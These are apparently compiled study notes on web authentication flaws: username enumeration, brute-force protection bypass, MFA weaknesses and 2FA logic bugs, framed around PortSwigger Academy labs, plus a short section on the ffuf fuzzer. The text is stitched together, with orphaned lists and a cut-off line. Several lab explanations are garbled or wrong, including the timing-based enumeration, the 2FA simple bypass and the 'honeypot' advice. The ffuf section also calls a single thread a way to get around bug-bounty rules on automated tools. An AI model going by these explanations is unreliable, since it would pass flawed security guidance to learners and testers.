<p>Authentication vulnerabilities in web applications can lead to unauthorized access, data breaches, and compromise of user accounts. Here are some common authentication vulnerabilities that can be found in web apps:</p>
<ol>
<li>
<p><strong>Weak Passwords</strong>: Allowing users to create weak passwords (e.g., simple, easily guessable, or commonly used passwords) can make it easier for attackers to brute-force their way into user accounts.</p>
</li>
<li>
<p><strong>No Account Lockout Policy</strong>: Lack of an account lockout policy or setting it to a high threshold makes the application susceptible to brute-force attacks, where attackers repeatedly try different passwords until they gain access.</p>
</li>
<li>
<p><strong>Insecure Password Storage</strong>: Storing passwords in plaintext or using weak hashing algorithms (e.g., MD5 or SHA-1) instead of strong hashing with salt can expose user credentials if the database is compromised.</p>
</li>
<li>
<p><strong>Session Management Issues</strong>: Poorly managed session tokens can lead to session hijacking or session fixation attacks, allowing attackers to impersonate legitimate users.</p>
</li>
<li>
<p><strong>Insecure Token Handling</strong>: If tokens (e.g., JWTs) are not adequately protected or have weak validation mechanisms, attackers can tamper with or forge tokens to gain unauthorized access.</p>
</li>
<li>
<p><strong>Insufficient Account Recovery Mechanisms</strong>: Weak or easily bypassable account recovery mechanisms can allow attackers to take over user accounts.</p>
</li>
<li>
<p><strong>Username Enumeration</strong>: When the application provides different responses for valid and invalid usernames during the login process, attackers can use this information to discover valid usernames and target them.</p>
</li>
<li>
<p><strong>Cross-Site Request Forgery (CSRF)</strong>: CSRF attacks can trick authenticated users into performing unintended actions on a website while they are logged in.</p>
</li>
<li>
<p><strong>Login Captcha Bypass</strong>: Ineffective CAPTCHA systems can be bypassed using automated scripts, allowing attackers to launch automated attacks on login forms.</p>
</li>
<li>
<p><strong>Brute-Force Protection Bypass</strong>: Attackers may find ways to bypass brute-force protection mechanisms, like IP blocking or rate limiting, to continue their attacks.</p>
</li>

These vulnerabilities can be exploited by attackers to gain unauthorized access to user accounts and sensitive data. Here are some of the common vulnerabilities found in password-based login systems:</p>
<ol>
<li>
<p><strong>Weak Passwords</strong>: Users often choose weak passwords that are easy to guess or crack. Common passwords, dictionary words, and easily obtainable personal information make it easier for attackers to perform brute-force or dictionary attacks to guess passwords.</p>
</li>
<li>
<p><strong>Password Reuse</strong>: Many users reuse the same passwords across multiple accounts and services. If one of these accounts is compromised, attackers can use the same credentials to gain unauthorized access to other services.</p>
</li>
<li>
<p><strong>Insecure Password Storage</strong>: Storing passwords in plaintext or using weak hashing algorithms without salt can lead to the exposure of user credentials in the event of a data breach.</p>
</li>
<li>
<p><strong>Inadequate Password Policies</strong>: Lax password policies that do not enforce complexity requirements or minimum password length make it easier for attackers to guess or crack passwords.</p>
</li>
<li>
<p><strong>No Account Lockout Policy</strong>: Failing to implement an account lockout policy allows attackers to perform brute-force attacks without any hindrance.</p>
</li>
<li>
<p><strong>Password Reset Vulnerabilities</strong>: Weaknesses in the password reset process, such as predictable reset tokens or insufficient authorization checks, can enable attackers to take control of accounts.</p>
</li>
<li>
<p><strong>Phishing Attacks</strong>: Phishing attacks trick users into disclosing their passwords to fraudulent websites that mimic legitimate login pages. Unsuspecting users may unknowingly provide their login credentials to attackers.</p>
</li>
<li>
<p><strong>Man-in-the-Middle (MITM) Attacks</strong>: Insecure communication channels can expose login credentials to eavesdroppers in MITM attacks.</p>
</li>
<li>
<p><strong>Credential Stuffing</strong>: Attackers use username and password combinations leaked from other breaches to gain unauthorized access to accounts where users have reused the same credentials.</p>
</li>
<li>
<p><strong>User Enumeration</strong>: If the login process provides different responses for valid and invalid usernames, attackers can use this information to discover valid usernames and target them.</p>
</li>
<li>
<p><strong>Brute-Force Attacks</strong>: Attackers may attempt to systematically try all possible combinations of characters to guess passwords and gain access to user accounts.</p>
</li>
</ol>
<p>To mitigate vulnerabilities in password-based login systems, organizations should follow best practices for secure password management:</p>
<ul>
<li>Enforce strong password policies that require a combination of uppercase, lowercase letters, numbers, and special characters.</li>
<li>Encourage users to use unique passwords for each service and to avoid password reuse.</li>
<li>Implement multi-factor authentication (MFA) to add an extra layer of security.</li>
<li>Store passwords securely using strong hashing algorithms with random salts.</li>
<li>Monitor for suspicious login activity and implement account lockout policies to prevent brute-force attacks.</li>
<li>Educate users about the risks of phishing and the importance of keeping their passwords confidential.</li>
</ul>
<p>By taking these steps, organizations can significantly reduce the risks associated with password-based login vulnerabilities and enhance the overall security of their systems.</p>

<p>Sure. The Username enumeration via different responses tutorial example in PortSwigger Academy demonstrates how a website can be vulnerable to username enumeration attacks by using different responses.</p>
<p>In the tutorial, the user is first prompted to enter their username and password. After they have successfully entered their credentials, they are logged in to the website.</p>
<p>The website has different responses for valid and invalid usernames. Specifically, the website returns a different HTML page for invalid usernames.</p>
<p>This means that an attacker can use this difference to enumerate valid usernames. Specifically, the attacker can submit a list of usernames to the website and see if the response is a HTML page or an error message. If the response is an HTML page, the attacker can infer that the username is invalid.</p>
<p>To exploit this vulnerability, the attacker would first need to obtain a list of possible usernames for the website. This could be done through a variety of methods, such as social engineering or dictionary attacks.</p>
<p>Once the attacker has a list of possible usernames, they would need to submit the list to the website and see if the response is a HTML page or an error message. If the response is an HTML page, the attacker can infer that the username is invalid. The attacker can then continue to submit usernames until they find one that is a valid username, which will result in a login page.</p>
<p>The Username enumeration via different responses tutorial example is a good demonstration of how a website can be vulnerable to username enumeration attacks by using different responses. It is important to be aware of these vulnerabilities and to take steps to protect yourself.</p>
<p>Here are some tips for protecting yourself from username enumeration attacks:</p>

<li>Train yourself and your employees on how to identify and avoid phishing attacks.</li>
</ul>
<p>By following these tips, you can help to protect yourself from username enumeration attacks and keep your accounts safe.</p>
<p>In addition to the tips above, there are a few things that the website can do to protect itself from username enumeration attacks:</p>
<ul>
<li>Use a rate limiting mechanism to prevent users from submitting too many requests in a short period of time.</li>
<li>Use a honeypot account to lure attackers into entering invalid usernames.</li>

<p>Find the way that the website is protecting against username enumeration -

<p>Sure. The Username enumeration via response timing tutorial example in PortSwigger Academy demonstrates how a website can be vulnerable to username enumeration attacks by using timing differences in response times.</p>
<p>In the tutorial, the user is first prompted to enter their username and password. After they have successfully entered their credentials, they are logged in to the website.</p>
<p>The website has a timing difference in response times for valid and invalid usernames. Specifically, the website takes longer to respond to requests with invalid usernames than with valid usernames.</p>
<p>This means that an attacker can use this timing difference to enumerate valid usernames. Specifically, the attacker can submit a list of usernames to the website and measure the response time for each request. If the response time is longer than a certain threshold, the attacker can infer that the username is invalid.</p>
<p>To exploit this vulnerability, the attacker would first need to obtain a list of possible usernames for the website. This could be done through a variety of methods, such as social engineering or dictionary attacks.</p>
<p>Once the attacker has a list of possible usernames, they would need to submit the list to the website and measure the response time for each request. If the response time is longer than a certain threshold, the attacker can infer that the username is invalid. The attacker can then continue to submit usernames until they find one that has a shorter response time, indicating that it is a valid username.</p>
<p>The Username enumeration via response timing tutorial example is a good demonstration of how a website can be vulnerable to username enumeration attacks by using timing differences in response times. It is important to be aware of these vulnerabilities and to take steps to protect yourself.</p>
<p>Here are some tips for protecting yourself from username enumeration attacks:</p>
<ul>
<li>Use a strong username for your online accounts.</li>
<li>Change your usernames regularly.</li>
<li>Be suspicious of emails or text messages that ask for your personal information.</li>
<li>Install antivirus software and keep it up to date.</li>
<li>Be careful about what websites you visit and what links you click on.</li>
<li>Train yourself and your employees on how to identify and avoid phishing attacks.</li>
</ul>
<p>By following these tips, you can help to protect yourself from username enumeration attacks and keep your accounts safe.</p>
<p>In addition to the tips above, there are a few things that the website can do to protect itself from username enumeration attacks:</p>
<ul>
<li>Use a rate limiting mechanism to prevent users from submitting too many requests in a short period of time.</li>
<li>Use a honeypot account to lure attackers into entering invalid usernames.</li>
<li>Implement a CAPTCHA challenge to verify that the user is human.</li>
<li>Use a random delay mechanism to prevent attackers from measuring response times.</li>
</ul>
<p>By implementing these measures, the website can help to protect itself from username enumeration attacks.</p>

<p>Sure. The Broken brute-force protection, IP block tutorial example in PortSwigger Academy demonstrates how a website can be vulnerable to brute-force attacks if it does not properly implement IP blocking.</p>
<p>In the tutorial, the user is first prompted to enter their username and password. After they have successfully entered their credentials, they are logged in to the website.</p>
<p>The website has a brute-force protection mechanism in place. This mechanism blocks the IP address of any user who makes more than three failed login attempts in a row.</p>
<p>However, the brute-force protection mechanism is flawed in the way that it handles IP addresses. Specifically, the website does not adequately verify that the IP address is unique.</p>
<p>This means that an attacker could use a proxy server to rotate their IP address and bypass the brute-force protection mechanism.</p>
<p>To exploit this vulnerability, the attacker would first need to obtain a list of possible usernames for the website. This could be done through a variety of methods, such as social engineering or dictionary attacks.</p>
<p>Once the attacker has a list of possible usernames, they would need to use a proxy server to rotate their IP address. They would then need to submit the list of usernames to the website, one username per request. If even one of the usernames is valid, the attacker will be able to log in to the website.</p>
<p>The Broken brute-force protection, IP block tutorial example is a good demonstration of how a website can be vulnerable to brute-force attacks if it does not properly implement IP blocking. It is important to be aware of these vulnerabilities and to take steps to protect yourself.</p>

<p>In the tutorial, the user is first prompted to enter their username and password. After they have successfully entered their credentials, they are logged in to the website.</p>
<p>The website has a mechanism in place to prevent users from guessing usernames. This mechanism locks the account for a period of time if the user enters an invalid username three times.</p>
<p>However, the username enumeration attack works by exploiting this mechanism. Specifically, the attacker can submit a list of usernames to the website and wait for the accounts to be locked.</p>
<p>Once the accounts are locked, the attacker can then try to log in to the website using the locked accounts. If the attacker is lucky, they will be able to log in to one of the accounts and gain access to the website.</p>

<p>Fuzz Faster U Fool is a great tool for fuzzing. It is written in Go and is very
fast. It is also very easy to use. It is a swiss army knife for fuzzing, and 
can be used for many purposes. It can be used for fuzzing web applications, 
DNS, and even file systems.</p>
<p>The pther side of this is that is an automated tool. It is not a tool that is
allowed to be used in many bug bounty programs, but you can bypass this by
using:</p>
<pre><code class="language-shell">ffuf -t 1
</code></pre>
<pre><code class="language-text">ffuf --help | rg threads

-t     Number of concurrent threads. (default: 40)
</code></pre>
<p>This will make ffuf run in a single thread, which is allowed in most bug bounty
programs. Default is 40 threads. That's why it's so fast. The exact number of
threads that is allowed is not known, but it's usually 1-5.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="multi-factor-authenticationmfa"><a class="header" href="#multi-factor-authenticationmfa">Multi-factor authentication(MFA)</a></h1>
<p>Multi-factor authentication (MFA) is a security process that requires users to provide two or more pieces of evidence to verify their identity. This makes it much more difficult for attackers to gain unauthorized access to accounts, even if they have stolen passwords or other credentials.</p>
<p>However, no security system is perfect, and MFA is no exception. There are a number of vulnerabilities that can be exploited by attackers. Some of the most common vulnerabilities in MFA include:</p>
<ul>
<li><strong>SIM swapping attacks:</strong> In a SIM swapping attack, an attacker tricks a mobile carrier into transferring a victim's phone number to a new SIM card that they control. This allows the attacker to receive the one-time passwords (OTPs) that are sent to the victim's phone as part of MFA.</li>
<li><strong>Phishing attacks:</strong> Phishing attacks are designed to trick users into revealing their personal information, such as their passwords or OTPs. Attackers often send emails or text messages that appear to be from legitimate sources, such as banks or online retailers. The emails or text messages will often contain links that, when clicked, will take the user to a fake website that looks like the real website. Once the user enters their personal information on the fake website, the attacker can steal it.</li>
<li><strong>Malware attacks:</strong> Malware can be used to steal OTPs or other MFA credentials. Attackers often distribute malware through infected emails, attachments, or websites. Once the malware is installed on a user's computer, it can steal their MFA credentials and send them back to the attacker.</li>
<li><strong>Human error:</strong> Even the best security systems are only as good as the people who use them. Users can make mistakes, such as entering their MFA credentials incorrectly or clicking on phishing links. These mistakes can be exploited by attackers to gain unauthorized access to accounts.</li>
</ul>
<p>It is important to be aware of the vulnerabilities in MFA and to take steps to protect yourself. Some of the things you can do to protect yourself from MFA attacks include:</p>
<ul>
<li>Use a strong password for your MFA app or token.</li>
<li>Enable two-factor authentication for all of your online accounts.</li>
<li>Keep your MFA app or token up to date with the latest security patches.</li>
<li>Be suspicious of emails or text messages that ask for your personal information.</li>
<li>Install antivirus software and keep it up to date.</li>
<li>Be careful about what websites you visit and what links you click on.</li>
<li>Train yourself and your employees on how to identify and avoid phishing attacks.</li>
</ul>
<p>By following these tips, you can help to protect yourself from MFA attacks and keep your accounts safe.</p>
<p>Multi-factor authentication (MFA) is generally considered a more secure method of protecting accounts compared to single-factor authentication (e.g., just using a password). However, like any security measure, MFA is not immune to vulnerabilities. Here are some potential vulnerabilities and considerations related to multi-factor authentication:</p>
<ol>
<li>
<p><strong>Phishing Attacks</strong>: Attackers might try to trick users into providing their MFA codes by impersonating legitimate services or sending malicious links. Users should be cautious and verify the authenticity of requests before entering their MFA codes.</p>
</li>
<li>
<p><strong>SIM Swapping</strong>: Attackers can convince a mobile carrier to transfer a victim's phone number to a SIM card controlled by the attacker. This can allow them to intercept MFA codes sent via SMS.</p>
</li>
<li>
<p><strong>Device Theft or Loss</strong>: If a device containing the MFA token (e.g., a smartphone) is lost or stolen, an attacker might gain access to the MFA codes.</p>
</li>
<li>
<p><strong>Backup Codes</strong>: Many MFA systems provide backup codes that can be used to access an account if the primary authentication method is unavailable. If these codes are not securely stored, they could be stolen and used by an attacker.</p>
</li>
<li>
<p><strong>Authentication App Compromise</strong>: If the authenticator app used for MFA is compromised (e.g., through malware or a security vulnerability), an attacker could gain access to the generated codes.</p>
</li>
<li>
<p><strong>Biometric Vulnerabilities</strong>: Some MFA methods use biometric data (fingerprint, face recognition, etc.). If an attacker can replicate or manipulate biometric data, they could potentially bypass this layer of security.</p>
</li>
<li>
<p><strong>Social Engineering</strong>: Attackers might use social engineering techniques to manipulate individuals into providing their MFA codes or revealing other sensitive information.</p>
</li>
<li>
<p><strong>Vulnerabilities in MFA Implementation</strong>: Like any software, the implementation of MFA could have vulnerabilities that attackers might exploit.</p>
</li>
</ol>
<p>To mitigate these vulnerabilities, it's important to follow best practices:</p>
<ul>
<li>
<p><strong>Use App-Based MFA</strong>: Whenever possible, use app-based MFA (like TOTP or OTP codes) instead of SMS-based MFA. App-based methods are generally more secure.</p>
</li>
<li>
<p><strong>Secure Device</strong>: Ensure that the device used for MFA is protected with strong passwords or biometric authentication.</p>
</li>
<li>
<p><strong>Use Strong Backup Methods</strong>: If using backup codes, make sure they are stored securely (e.g., offline and in a safe location).</p>
</li>
<li>
<p><strong>Regularly Review Account Activity</strong>: Regularly review your account activity and enable alerts for suspicious activity.</p>
</li>
<li>
<p><strong>Stay Informed</strong>: Stay up-to-date with security best practices and potential threats related to MFA.</p>
</li>
</ul>
<p>Remember that no security measure is entirely foolproof, but using multi-factor authentication significantly increases the difficulty for attackers to compromise an account. Always stay vigilant and take steps to protect your online accounts.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="2fa-simple-bypass"><a class="header" href="#2fa-simple-bypass">2FA simple bypass</a></h1>
<p>Sure. The 2FA simple bypass tutorial example in PortSwigger Academy demonstrates how a flawed implementation of two-factor authentication (2FA) can be bypassed.</p>
<p>In the tutorial, the user is first prompted to enter their username and password. After they have successfully entered their credentials, they are taken to a second page where they are prompted to enter a verification code. The verification code is sent to the user's phone via SMS.</p>
<p>However, the tutorial website is flawed in the way that it handles the second step of the 2FA process. Specifically, the website does not adequately verify that the user is the same person who entered the username and password in the first step.</p>
<p>This means that an attacker could log in to the website using the victim's username and password, and then change the value of the verification code cookie to any arbitrary value. When the attacker submits the verification code, the website will accept it and the attacker will be logged in.</p>
<p>To exploit this vulnerability, the attacker would first need to obtain the victim's username and password. This could be done through a variety of methods, such as phishing or social engineering.</p>
<p>Once the attacker has the victim's credentials, they would need to log in to the website using the username and password. After they have successfully logged in, they would need to find the verification code cookie. The verification code cookie is usually stored in the user's browser.</p>
<p>Once the attacker has found the verification code cookie, they would need to change the value of the cookie to any arbitrary value. They could then submit the verification code and be logged in to the website.</p>
<p>The 2FA simple bypass tutorial example is a good demonstration of how a flawed implementation of 2FA can be exploited. It is important to be aware of these vulnerabilities and to take steps to protect yourself.</p>
<p>Here are some tips for protecting yourself from 2FA bypasses:</p>
<ul>
<li>Use a strong password for your 2FA app or token.</li>
<li>Enable two-factor authentication for all of your online accounts.</li>
<li>Keep your 2FA app or token up to date with the latest security patches.</li>
<li>Be suspicious of emails or text messages that ask for your personal information.</li>
<li>Install antivirus software and keep it up to date.</li>
<li>Be careful about what websites you visit and what links you click on.</li>
<li>Train yourself and your employees on how to identify and avoid phishing attacks.</li>
</ul>
<p>By following these tips, you can help to protect yourself from 2FA bypasses and keep your accounts safe.</p>

<div style="break-before: page; page-break-before: always;"></div><h1 id="2fa-broken-logic"><a class="header" href="#2fa-broken-logic">2FA broken logic</a></h1>
<p>Flawed two-factor verification (2FA) logic is a security vulnerability that can allow attackers to bypass 2FA and gain unauthorized access to accounts. This vulnerability can occur in a variety of ways, such as:</p>
<ul>
<li><strong>Incorrectly validating 2FA codes:</strong> If the 2FA logic does not properly validate the 2FA codes that users enter, attackers may be able to enter invalid codes and still be granted access to accounts.</li>
<li><strong>Allowing multiple login attempts with the same 2FA code:</strong> If the 2FA logic allows users to log in multiple times with the same 2FA code, attackers may be able to intercept a user's 2FA code and use it to log in to the user's account multiple times.</li>
<li><strong>Not requiring 2FA for all sensitive actions:</strong> If the 2FA logic does not require 2FA for all sensitive actions, such as changing a user's password or withdrawing money from their account, attackers may be able to perform these actions without the user's knowledge or consent.</li>
</ul>
<p>The PortSwigger tutorial about flawed 2FA logic describes a number of techniques that attackers can use to exploit this vulnerability. For example, attackers can use brute force attacks to guess 2FA codes, or they can use phishing attacks to trick users into revealing their 2FA codes.</p>
<p>To protect against flawed 2FA logic, organizations should:</p>
<ul>
<li><strong>Validate 2FA codes properly:</strong> The 2FA logic should validate all 2FA codes that users enter to ensure that they are valid and have not been used previously.</li>
<li><strong>Prevent multiple login attempts with the same 2FA code:</strong> The 2FA logic should prevent users from logging in multiple times with the same 2FA code.</li>
<li><strong>Require 2FA for all sensitive actions:</strong> The 2FA logic should require 2FA for all sensitive actions, such as changing a user's password or withdrawing money from their account.</li>
<li><strong>Use strong 2FA methods:</strong> Organizations should use strong 2FA methods, such as time-based one-time passwords (TOTPs) or WebAuthn, to protect against 2FA attacks.</li>
</ul>
<h2 id="summary-3"><a class="header" href="#summary-3">Summary</a></h2>
<p>Flawed 2FA logic is a security vulnerability that can allow attackers to bypass 2FA and gain unauthorized access to accounts. Organizations can protect against this vulnerability by validating 2FA codes properly, preventing multiple login attempts with the same 2FA code, requiring 2FA for all sensitive actions, and using strong 2FA methods.</p>
